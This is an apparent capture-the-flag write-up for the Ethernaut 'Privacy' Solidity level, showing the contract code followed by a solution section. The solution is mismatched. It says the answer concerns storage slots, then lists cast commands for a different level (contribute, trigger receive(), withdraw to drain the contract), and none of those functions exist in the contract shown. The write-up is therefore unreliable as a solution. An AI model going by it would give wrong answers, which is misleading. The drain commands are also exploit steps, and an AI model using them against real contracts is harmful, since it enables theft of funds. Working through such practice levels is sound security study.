## Privacy Level Outline

**Difficulty : 8/10**

The creator of this contract was careful enough to protect the sensitive areas of its storage.

Unlock this contract to beat the level.

```solidity  
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) public {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }
}
```

[Link to level on Ethernaut](https://ethernaut.openzeppelin.com/level/0x11343d543778213221516D004ED82C45C3c8788B)

## Solution

To solve this level, we need to know about how contract storage slots work. 

### Walkthrough
1. contributing some eth by calling the "contribute()" function
```console
cast send $LEVEL_ADDRESS "contribute()" --value 0.0001ether --private-key=$PRIVATE_KEY
```

2. trigger the fallback function **receive()** by sending an eth transaction with an empty data field
```console
cast send $LEVEL_ADDRESS --value 0.0001ether --private-key $PRIVATE_KEY
```

3. draining the contract
```console
cast send $LEVEL_ADDRESS "withdraw()" --private-key $PRIVATE_KEY
```
## Further Reading

```
    Ether is sent to contract?
                |
        is msg.data empty?
                / \
               /   \
             yes    no  
             /       \    
        receive()    fallback()
         exist?                      
        /     \
       yes     no          
      /         \
  receive()     fallback()
```

